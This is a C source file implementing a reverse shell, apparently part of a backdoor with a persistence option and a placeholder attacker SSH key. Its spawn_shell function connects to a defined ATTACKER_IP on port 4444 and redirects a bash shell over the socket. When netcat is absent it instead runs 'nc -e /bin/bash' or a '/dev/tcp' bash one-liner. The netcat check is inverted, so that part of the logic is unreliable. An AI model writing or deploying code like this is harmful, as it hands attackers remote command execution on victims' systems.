#include <stdbool.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKER_IP "127.0.0.1"
#define PORT 4444
#define ATTACKER_SSH_PUBLIC_KEY ""

bool spawn_shell(bool hasPersistency);

bool spawn_shell(bool hasPersistency){

    if (system("which nc > /dev/null 2>&1")) {

        int socket_fd;
        struct sockaddr_in server_addr;

        if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { // use IPv4 and TCP
            printf("\nCannot create socket\n");
            return false;
        }

        server_addr.sin_family = AF_INET; // use IPv4
        server_addr.sin_port = htons(PORT);
        server_addr.sin_addr.s_addr = inet_addr(ATTACKER_IP); // Convert IPv4 addresses from text to binary

        for(int i = 0; i < 5; i++){
            if(connect(socket_fd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0){
                sleep(1);

                if(i == 4)
                    return false;
            }else{
                break;
            }
        }

        // make file descriptor socket_fd refer to stdin, stdout, stderr
        dup2(socket_fd, 0);
        dup2(socket_fd, 1);
        dup2(socket_fd, 2);

        char * const argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL); // execute new shell

    } else {
        char command[128];

        snprintf(command, sizeof(command), "nc -e /bin/bash %s %i || bash -i >& /dev/tcp/%s/%i 0>&1", ATTACKER_IP, PORT, ATTACKER_IP, PORT);

        for(int i = 0; i < 3; ++i){
            if(!system(command))
                break;

            sleep(1);
        }
        
    }
}